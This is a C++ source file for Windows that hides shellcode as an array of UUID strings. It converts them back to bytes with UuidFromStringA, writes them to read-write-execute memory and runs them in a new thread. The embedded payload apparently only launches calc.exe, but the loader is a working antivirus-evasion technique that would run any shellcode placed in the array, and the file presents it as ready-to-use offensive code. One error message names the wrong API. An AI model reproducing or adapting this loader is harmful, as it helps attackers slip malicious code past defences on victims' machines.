#include <cstdio>
#include <cstdlib>
#include <Windows.h>
#pragma comment(lib, "Ntdll.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif


const char* UuidArray[19] = {
        "E48348FC-E8F0-00C0-0000-415141505251", "D2314856-4865-528B-6048-8B5218488B52", "728B4820-4850-B70F-4A4A-4D31C94831C0",
        "7C613CAC-2C02-4120-C1C9-0D4101C1E2ED", "48514152-528B-8B20-423C-4801D08B8088", "48000000-C085-6774-4801-D0508B481844",
        "4920408B-D001-56E3-48FF-C9418B348848", "314DD601-48C9-C031-AC41-C1C90D4101C1", "F175E038-034C-244C-0845-39D175D85844",
        "4924408B-D001-4166-8B0C-48448B401C49", "8B41D001-8804-0148-D041-5841585E595A", "59415841-5A41-8348-EC20-4152FFE05841",
        "8B485A59-E912-FF57-FFFF-5D48BA010000", "00000000-4800-8D8D-0101-000041BA318B", "D5FF876F-F0BB-A2B5-5641-BAA695BD9DFF",
        "C48348D5-3C28-7C06-0A80-FBE07505BB47", "6A6F7213-5900-8941-DAFF-D5433A5C7769", "776F646E-5C73-7973-7374-656D33325C63",
        "2E636C61-7865-0065-9090-909090909090"
};

typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
    RPC_CSTR    StringUuid,
    UUID* Uuid
    );

BOOL UUIDDeobfuscation(IN const CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

    PBYTE pBuffer = NULL;
    PBYTE TmpBuffer = NULL;

    SIZE_T sBuffSize = NULL;

    PCSTR Terminator = NULL;
    NTSTATUS STATUS = NULL;

    fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
    if (!pUuidFromStringA) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    sBuffSize = NmbrOfElements * 16;
    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);

    if (pBuffer == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    TmpBuffer = pBuffer;

    for (size_t i = 0; i < NmbrOfElements; ++i) {

        STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer);

        if (!NT_SUCCESS(STATUS)) {
            printf("[!] RtlIpv4StringToAddressA Failed At [%s] With Error 0x%0.8X", UuidArray[i], STATUS);
            return FALSE;
        }

        TmpBuffer = (PBYTE)(TmpBuffer + 16);

    }

    *ppDAddress = pBuffer;
    *pDSize = sBuffSize;

    return TRUE;

}
int main()
{


    // Local buffer for execute 
    LPVOID exec_mem;
    // Pointer on buffer where stored a shellcode
    PBYTE ppDAddress = NULL;
    // Shell code size 
    SIZE_T pDSize = 0;
    // local thread for execute 
    HANDLE hThread = NULL;

    // Deobfuscate shellcode
    UUIDDeobfuscation(UuidArray, 19, &ppDAddress, &pDSize);

    exec_mem = VirtualAlloc(0, pDSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    RtlMoveMemory(exec_mem, ppDAddress, pDSize);

    hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
    WaitForSingleObject(hThread, -1);

    if (ppDAddress != NULL)
    {
        HeapFree(GetProcessHeap(), 0, ppDAddress);
    }

    return 0;
}
